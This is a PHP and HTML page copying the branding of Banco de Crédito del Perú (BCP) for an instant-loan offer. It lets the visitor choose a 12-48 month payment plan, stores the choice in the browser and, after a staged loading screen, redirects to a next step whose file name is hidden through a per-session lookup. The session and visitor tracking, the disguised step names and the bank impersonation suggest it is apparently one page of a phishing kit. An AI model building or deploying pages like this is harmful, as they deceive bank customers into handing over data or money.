<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_five.php";

$next_location_encrypted = $directory_array[$next_location].".php";

?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Banco de Crédito >> BCP >></title>
	<link rel="stylesheet" href="files/main.css">
	<meta content="width=device-width, initial-scale=1 user-scalable=no" name="viewport" >
	<link href="files/favicon.ico" rel="icon" type="image/x-icon">
	<!-- <link rel="stylesheet" href="./2_files/auxi.css"> -->
	<link rel="stylesheet" href="files/stylo.css">
	
	<style>
		
		#bodyloader {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background-color: var(--primary-700, #002a8d);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            position: relative;
            width: 70px;
            height: 70px;
            border: 3px solid #002376;
            border-top: 3px solid var(--secondary-500, #ff7800);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .image {
            width: 30px;
            height: 30px;
            background-image: url("files/favicon.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }
		
		.loading {
			padding: 420px 0px 0px 410px;
		}
		
		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}
		
		body {
			display: flex;
			justify-content: center;
			align-items: center;
    		height: 100vh;
    		margin: 0;
		}

		.banner {
			/* Agrega estas reglas para centrar el contenido */
			display: flex;
    		justify-content: center;
		}

		.linea-de-tiempo {
			display: flex;
    		align-items: center;
    		top: 70px;
    		position: relative;
    		margin: 0 auto; /* Centra horizontalmente */
		}
		
		.numero {
			min-height: 35px;
   			min-width: 35px;
    		width: 35px;
    		height: 35px;
    		background-color: white;
    		color: #878c8f;
			border: 2px solid #878c8f;
    		border-radius: 50%;
    		text-align: center;
    		line-height: 30px;
    		margin: 0 0px; /* Espacio entre los números */
			font-family: Geometria, sans-serif;
		}

		.linea {
			flex: 1;
    		border-top: 2px solid #878c8f;
    		margin: 0 0px;
    		max-width: 40px;
    		min-width: 40px;
		}

		.custom-slider {
			width: 100%;
            position: relative;
			margin-top:20px;
		}
		
		.custom-slider input[type="range"] {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado de otros navegadores */
            width: 100%; /* Ancho completo del control deslizante */
            height: 10px; /* Altura del control deslizante */
            background: linear-gradient(#05be50,#05be50,#05be50,#05be50,#05be50,#05be50,#05be50);
            border-radius: 5px; /* Bordes redondeados */
		}

		.custom-slider input[type="range"]::-webkit-slider-thumb {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de otros navegadores */
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            cursor: pointer;
			border: 1px solid #eceded;
			box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
		}
		
		#montoLabel {
            position: absolute;
            bottom: 25px; /* Ajusta la distancia desde abajo */
            left: 50%; /* Centra horizontalmente */
            transform: translateX(-50%);
            font-weight: bold;
		}

        /* Estilos para la caja de herramientas */
        .tooltip {
            position: relative;
            display: inline-block;
        }

        .tooltip-text {
            visibility: hidden;
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff;
            text-align: center;
            border-radius: 5px;
            padding: 5px;
            position: absolute;
            z-index: 1;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            transition: visibility 0.2s ease-in-out;
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
        }
		
		.input-container {
			position: relative;
		}
		

		/* Estilos para el input */
		.styled-input {
			padding-left: 2.5em; /* Espacio para el label */
		}

		/* Estilos para el label */
		.input-label {
			position: absolute;
  			left: 0.5em; /* Posición izquierda */
  			top: 50%; /* Centrar verticalmente */
  			transform: translateY(-50%);
  			pointer-events: none; /* Evitar que el label interfiera con la interacción del input */
		}
		
		
		input[type="radio"]:checked {
			
			border: 6px solid #05be50 !important;
		}
		
		.cuota {
			width: 86%;
    		position: relative;
    		left: 7%;
    		height: 230px;
    		border: 2px solid #eceded;
    		border-radius: 8px;
   		 	margin-bottom: 25px;
    		max-height: 230px;
    		text-align: center;
			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		}
		
		.custom-select {
			border-radius: 4px;
  			border: 1px solid #eceded;
  			width: 100%;
  			font-size: 14px;
  			height: 48px !important;
  			position: relative;
			outline:none;
 			padding-left: 20px;
 			font-weight: 400;
  			letter-spacing: 0.5px;
  			background-color: white !important;
  			-webkit-box-sizing: border-box;
  			-moz-box-sizing: border-box;
  			box-sizing: border-box;
  			-webkit-appearance: none;
		}
		
		.custom-select:focus {
			border: 2px solid #ff0000;
		}
		
		#presente::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			
    		text-rendering: optimizeLegibility;
		}
		
		#llave::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			padding-left: 25px;
    		text-rendering: optimizeLegibility;
		}
		
		.loader {
    		border: 2.5px solid white;
    		border-top: 4px solid transparent;
    		border-radius: 50%;
    		width: 20px;
    		height: 20px;
    		animation: spin 1s linear infinite;
    		position: absolute;
    		top: 50%;
    		left: 50%;
    		margin-top: -10px;
    		margin-left: -10px;
    		display: none;
		}

		/* Animación de rotación del loader */
		@keyframes spin {
			0% { transform: rotate(0deg); }
    		100% { transform: rotate(360deg); }
		}

		/* Estilos para el botón personalizado */
		.custom-button {
    		position: relative; /* Para que el loader se posicione correctamente */
		}

		/* Mostrar el loader cuando el botón está deshabilitado */
		.btn-block:disabled .loader {
			display: block;
		}

		/* @font-face {
			font-family: Geometria;
			src: url(fonts/light.woff2) format("woff2"), url(fonts/light.woff) format("woff");
			font-weight: 300;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/medium.woff2) format("woff2"), url(fonts/medium.woff) format("woff");
			font-weight: 500;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/regular.woff2) format("woff2"), url(fonts/regular.woff) format("woff");
			font-weight: 400;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/semibold.woff2) format("woff2"), url(fonts/semibold.woff) format("woff");
			font-weight: 600;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		} */
		
		@media (max-width: 277px) {
			#tituloVerde {
				width:90% !important;
				left: 5% !important;
			}
		}
		
		@media (max-width: 277px) {
			#tituloVerde {
				font-size: 16px !important;
			}
		}
	
	</style>
	
</head>
	
<body>
	<div class="loading-screen" style="display:none;" id="bodyloader" style="height: 100%; margin: 0; overflow: hidden; background-color: var(--primary-700, #002a8d); display: none; align-items: center; justify-content: center;">
	 <div class="spinner-container">
		 <div class="image" style="top: 52px; width: 25px; position: relative;"></div>
		 <div class="spinner"></div>
		 <p class="message" style="text-align: center; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important; font-size: 13px; color: white; margin-top: 10px;">Espere un momento <br> por favor</p>
	 </div>
	</div>
	<div id="bodyapp">
	<app-root _nghost-aqk-c52="" ng-version="12.2.16">
		<router-outlet _ngcontent-aqk-c52=""></router-outlet>
		<app-initial-verify _nghost-aqk-c63="">
			<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;overflow-x:hidden;">
				<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
					<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
						<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
							<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="">
							</div>
						</app-channel-image>
					</div>
<bcp-navbar menu-position="right" is-fixed="" class="hydrated">
    <nav class="navbar navbar-expand-sm bg-primary-700 navbar-dark fixed-top" style="min-height: 60px; display: flex; justify-content: space-between;">
        <div class="container" style="width: 85%;">
            <a class="brand-margin-left navbar-brand">
                <bcp-img class="hydrated">
                    <img alt="Dinero al instante" src="files/dark-default.svg" class="hydrated">
                </bcp-img>
            </a>
        </div>
        <div id="hamburg" style="position: relative; right: 16px;">
            <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            </svg>
        </div>
    </nav>
</bcp-navbar>
					<eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="" style="width:100%">
						<button onclick="retrocederPagina()" type="button" class="btn btn-text btn-md" style="width: 35%; top: 80px; text-align: start; position: relative;">
							<bcp-paragraph class="hydrated"><!---->
								<p class="paragraph-md bcp-font-demi secondary-500">
									<bcp-icon _ngcontent-xnv-c62="" name="arrow-left-r" class="hydrated">
										<i class="icon arrow-left-r " aria-hidden="true" style="font-size:22px;"></i>
									</bcp-icon>  
									<span class="text-decoration" style="font-size: 15px; bottom: 3px; position: relative;">Volver</span>
								</p>
							</bcp-paragraph>
						</button>
						<div _ngcontent-hbf-c2="" class="banner" style="background-repeat: no-repeat; background-size: auto; max-height: 332px; min-height: 160px; height: 160px;background-image:none;">
							<div class="linea-de-tiempo">
								<div class="numero" style="background-color: #6AC90F; border: 2px solid #6AC90F;">
									<img src="files/checkwhiteandgreen.jpg" style="height: 21px; position: relative;">
								</div>
								<div class="linea" style="border-top: 2px solid #6AC90F;"></div>
								<div class="numero" style="color: var(--primary-700,#002a8d); border: 2px solid var(--primary-700,#002a8d);">
									<span style=" position: relative; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif;font-weight: 700;">2</span>
								</div>
								<div class="linea"></div>
								<div class="numero">
									<span style=" position: relative; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; font-weight: 700; ">3</span>
								</div>
								<div class="linea"></div>
								<div class="numero">
									<span style=" position: relative; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; font-weight: 700; ">4</span>
								</div>
							</div>
						</div>
					</eva-banner>
					<input type="hidden" id="monto" name="monto" value=""> 
						<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;background-color:white;">
							<div _ngcontent-aqk-c63="" class="row container-form" style="position: relative;margin-bottom:120px !important;">
								<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 0px;">
									<div _ngcontent-aqk-c63="" class="box-wrapper container">
										<form class="ng-pristine ng-invalid ng-touched" id="inicio">
											<div _ngcontent-aqk-c63="" class="row mt8 mb32" style="margin-bottom: 0px;margin-top:0px;">
												<div _ngcontent-aqk-c63="" class="col text-center">
													<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
														<h4 class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 600; position: relative; color: var(--primary-700,#002a8d); font-size: 20px; line-height: 1.2; width: 80%; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; margin-left: 10%; text-align: center; text-rendering: optimizeLegibility;top:20px;">Elige tu plan de pago
															<span id="userAgentInfo"></span>
														</h4>
													</bcp-title>
												</div>
											</div>
											<div _ngcontent-aqk-c63="" class="row mb24" style="margin-bottom:5px !important">
												<div _ngcontent-aqk-c63="" class="col">
													<bcp-select-input _ngcontent-aqk-c63="" class="ng-untouched ng-pristine ng-invalid hydrated">
														<br>
														<div class="row no-gutters select-input-container">
															<div class="col input-container">
																<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																	<bcp-input class="hydrated">
																		<div class="form-group">
																			<br>
																			<div class="swiper-slide" style="min-height: 265px; padding: 48px 32px 32px 32px; background: #FFFFFF; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); position: relative; margin-bottom: 40px; width: 90%; left: 5%; height: 100%; border-radius: 16px; transition-property: transform;">
																				<div class="bcp_seccion_texto_botones">
																					<div class="bcp_contenedor_titulo_descripcion">
																						<div class="recomendado" style="position: absolute; padding: 7px 12px 7px; background: #6AC90F; border-radius: 6px 6px 6px 0px; font-family: 'Flexo-demi'; font-weight: normal; font-size: 14px; line-height: 14px; color: #FFFFFF; z-index: 0; content: 'Recomendado'; left: -5px; top: 18px; display: flex; align-items: center;">
																							<span>
																								Menos intereses
																							</span>
																						</div>
																						<div class="cuotamensual" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; margin-top: 20px;">
																							<span class="spancuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Cuota mensual</span>
																							<span id="valorMontoCuota12" class="montocuota" style="color: #001f5a; font-size: 18px; font-weight: 600;">0</span>
																						</div>
																						<div class="numerodecuotas" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 20px; margin-top: 20px;">
																							<span class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Número de cuotas</span>
																							<span class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 16px; font-weight: 400;">12</span>
																						</div>
																						<div class="pagototal" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 10px; margin-top: 10px;">
																							<span class="spanpagototal" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Pago total</span>
																							<span id="valorMontoTotal12" class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 15px; font-weight: 400;">0</span>
																						</div>
																					</div>
																					<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones">
																						<button class="enviarSolicitud" data-plazo="12" data-valor="12" type="button" id="btnpri12" value="" class="btn btn-primary btn-lg btn-block" style="height: 35px; color: #ff7800; border-radius: 20px; width: 40%; padding: 8px; top: 10px; line-height: 16px; background-color: #ff7800;border: 2px solid #ff7800; margin-top: 0px; display: flex; position: relative;"> 
																							<p id="parrafoplazo12" class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;">Elegir</p>
																							<div class="loader" id="loaderplazo12"></div>
																						</button>
																					</div>
																				</div>
																			</div>
																			<div class="swiper-slide" style="min-height: 250px; padding: 32px; background: #FFFFFF; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); position: relative; margin-bottom: 40px; width: 90%; left: 5%; height: 100%; border-radius: 16px; transition-property: transform;">
																				<div class="bcp_seccion_texto_botones">
																					<div class="bcp_contenedor_titulo_descripcion">
																						<div class="cuotamensual" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; margin-top: 20px;">
																							<span class="spancuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Cuota mensual</span>
																							<span id="valorMontoCuota24" class="montocuota" style="color: #001f5a; font-size: 18px; font-weight: 600;">0</span>
																						</div>
																						<div class="numerodecuotas" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 20px; margin-top: 20px;">
																							<span class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Número de cuotas</span>
																							<span class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 16px; font-weight: 400;">24</span>
																						</div>
																						<div class="pagototal" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 10px; margin-top: 10px;">
																							<span class="spanpagototal" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Pago total</span>
																							<span id="valorMontoTotal24" class="montocuota" style="color: #001f5a; font-size: 15px; font-weight: 400;">0</span>
																						</div>
																					</div>
																					<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones">
																						<button class="enviarSolicitud" data-plazo="24" data-valor="24" type="button" id="btnpri24" value="" class="btn btn-primary btn-lg btn-block" style="height: 35px; color: #ff7800; border-radius: 20px; width: 40%; padding: 8px; top: 10px; line-height: 16px; background-color: #ff7800; border: 2px solid #ff7800; margin-top: 0px; display: flex; position: relative;"> 
																							<p id="parrafoplazo24" class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;">Elegir</p>
																							<div class="loader" id="loaderplazo24"></div>
																						</button>
																					</div>
																				</div>
																			</div>
																			<div class="swiper-slide" style="min-height: 250px; padding: 32px; background: #FFFFFF; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); position: relative; margin-bottom: 40px; width: 90%; left: 5%; height: 100%; border-radius: 16px; transition-property: transform;">
																				<div class="bcp_seccion_texto_botones">
																					<div class="bcp_contenedor_titulo_descripcion">
																						<div class="cuotamensual" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; margin-top: 20px;">
																							<span class="spancuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Cuota mensual</span>
																							<span id="valorMontoCuota36" class="montocuota" style="color: #001f5a; font-size: 18px; font-weight: 600;">0</span>
																						</div>
																						<div class="numerodecuotas" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 20px; margin-top: 20px;">
																							<span class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Número de cuotas</span>
																							<span class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 16px; font-weight: 400;">36</span>
																						</div>
																						<div class="pagototal" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 10px; margin-top: 10px;">
																							<span class="spanpagototal" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Pago total</span>
																							<span id="valorMontoTotal36" class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 15px; font-weight: 400;">0</span>
																						</div>
																					</div>
																					<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones">
																						<button class="enviarSolicitud" data-plazo="36" data-valor="36" type="button" id="btnpri36" value="" class="btn btn-primary btn-lg btn-block" style="height: 35px; color: #ff7800; border-radius: 20px; width: 40%; padding: 8px; top: 10px; line-height: 16px; background-color: #ff7800;border: 2px solid #ff7800; margin-top: 0px; display: flex; position: relative;"> 
																							<p id="parrafoplazo36" class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;">Elegir</p>
																							<div class="loader" id="loaderplazo36"></div>
																						</button>
																					</div>
																				</div>
																			</div>
																			<div class="swiper-slide" style="min-height: 250px; padding: 32px; background: #FFFFFF; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); position: relative; width: 90%; left: 5%; height: 100%; border-radius: 16px; transition-property: transform;">
																				<div class="bcp_seccion_texto_botones">
																					<div class="bcp_contenedor_titulo_descripcion">
																						<div class="cuotamensual" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; margin-top: 20px;">
																							<span class="spancuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Cuota mensual</span>
																							<span id="valorMontoCuota48" class="montocuota" style="color: #001f5a; font-size: 18px; font-weight: 600;">0</span>
																						</div>
																						<div class="numerodecuotas" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 20px; margin-top: 20px;">
																							<span class="spannumerodecuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Número de cuotas</span>
																							<span class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 16px; font-weight: 400;">48</span>
																						</div>
																						<div class="pagototal" style="display: flex; justify-content: space-between; align-items: center;margin-bottom: 10px; margin-top: 10px;">
																							<span class="spanpagototal" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a; font-weight: initial; color: #001f5a; font-size: 15px;">Pago total</span>
																							<span id="valorMontoTotal48" class="montocuota" style="color: var(--onsurface-800,#606c7f); font-size: 15px; font-weight: 400;">0</span>
																						</div>
																					</div>
																					<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones">
																						<button class="enviarSolicitud" data-plazo="48"  data-valor="48"  type="button" id="btnpri48" value="" class="btn btn-primary btn-lg btn-block" style="height: 35px; color: #ff7800; border-radius: 20px; width: 40%; padding: 8px; top: 10px; line-height: 16px; background-color: #ff7800;border: 2px solid #ff7800; margin-top: 0px; display: flex; position: relative;"> 
																							<p id="parrafoplazo48" class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;">Elegir</p>
																							<div class="loader" id="loaderplazo48"></div>
																						</button>
																					</div>
																				</div>
																			</div>
																		</div>
																		<bcp-paragraph class="helper-text hydrated">
																			<p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
																		</bcp-paragraph>
																	</bcp-input>
																</bcp-tooltip>
															</div>
														</div>
													<br>
												</bcp-select-input>
											</div>
										</div>
									</form>
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>
		</app-initial-verify>
	</app-root>
	<script type="text/javascript" src="files/jquery-3.1.0.min.js"></script>
	<script type="text/javascript" src="files/mask.js"></script>
	<script type="text/javascript" src="files/value.js"></script>
	<script>
		document.addEventListener("DOMContentLoaded", function() {
			var valorMontoGlobal = "";
			var valorCuota12, valorTotal12, valorCuota24, valorTotal24, valorCuota36, valorTotal36, valorCuota48, valorTotal48;

			valorMontoGlobal = localStorage.getItem("monto");

			if (valorMontoGlobal !== null) {
				var valorNumerico = parseFloat(valorMontoGlobal.replace("S/", "").replace(/,/g, ""));
				valorCuota12 = (valorNumerico / 12) + (valorNumerico / 12 * 0.073);
         		valorTotal12 = (valorNumerico * 0.073) + valorNumerico;
         		valorCuota24 = (valorNumerico / 24) + (valorNumerico / 24 * 0.073) + (valorNumerico / 24 * 0.073);
         		valorTotal24 = (valorNumerico * 0.073) + (valorNumerico * 0.073) + valorNumerico;
         		valorCuota36 = (valorNumerico / 36) + (valorNumerico / 36 * 0.073) + (valorNumerico / 36 * 0.073) + (valorNumerico / 36 * 0.073);
         		valorTotal36 = (valorNumerico * 0.073) + (valorNumerico * 0.073) + (valorNumerico * 0.073) + valorNumerico;
         		valorCuota48 = (valorNumerico / 48) + (valorNumerico / 48 * 0.073) + (valorNumerico / 48 * 0.073) + (valorNumerico / 48 * 0.073) + (valorNumerico / 48 * 0.073);
         		valorTotal48 = (valorNumerico * 0.073) + (valorNumerico * 0.073) + (valorNumerico * 0.073) + (valorNumerico * 0.073) + valorNumerico;
				document.getElementById("valorMontoCuota12").textContent = "S/ " + valorCuota12.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoTotal12").textContent = "S/ " + valorTotal12.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoCuota24").textContent = "S/ " + valorCuota24.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoTotal24").textContent = "S/ " + valorTotal24.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoCuota36").textContent = "S/ " + valorCuota36.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoTotal36").textContent = "S/ " + valorTotal36.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoCuota48").textContent = "S/ " + valorCuota48.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");
         		document.getElementById("valorMontoTotal48").textContent = "S/ " + valorTotal48.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, "$&,");

			}

			var enviarButtons = document.querySelectorAll(".enviarSolicitud");
			enviarButtons.forEach(function(button) {
				button.addEventListener("click", function() {
					var plazo = this.getAttribute("data-plazo");
					guardarEnLocalStorage(plazo);
				});
			});
			
			function guardarEnLocalStorage(plazo) {
				var cuota, total;
				var plazos;
				
				if (plazo === '12') {
					cuota = valorCuota12;
					total = valorTotal12;
					plazos = 12;
            		$("#parrafoplazo12").hide();
            		$("#loaderplazo12").show();
				} else if (plazo === '24') {
					cuota = valorCuota24;
					total = valorTotal24;
					plazos = 24;
            		$("#parrafoplazo24").hide();
            		$("#loaderplazo24").show();
				} else if (plazo === '36') {
					cuota = valorCuota36;
					total = valorTotal36;
					plazos = 36;
            		$("#parrafoplazo36").hide();
            		$("#loaderplazo36").show();
				} else if (plazo === '48') {
					cuota = valorCuota48;
					total = valorTotal48;
					plazos = 48;
            		$("#parrafoplazo48").hide();
            		$("#loaderplazo48").show();
				}

		  // Guardar los valores en localStorage
		  localStorage.setItem("cuota", cuota);
		  localStorage.setItem("total", total);
		  localStorage.setItem("plazos", plazos);

		  setTimeout(function() {
			  $("#bodyapp").hide();
			  $("#bodyloader").show();
			  setTimeout(function() {
				  window.location.href = "<?=$next_location_encrypted;?>";
			  }, 2500); // 5000 milisegundos = 5 segundos
			  }, 2000);
			}
		});
	</script>
	<script>
		function tipoFiltro(e) {
			var charCode = e.key;
			if((/^[0-9]+$/.test(charCode))) {
				return true;
			} else {
				return false;
			}
		}
		function retrocederPagina() {
			window.history.back();
		}
	</script>
</div>
</body>
</html>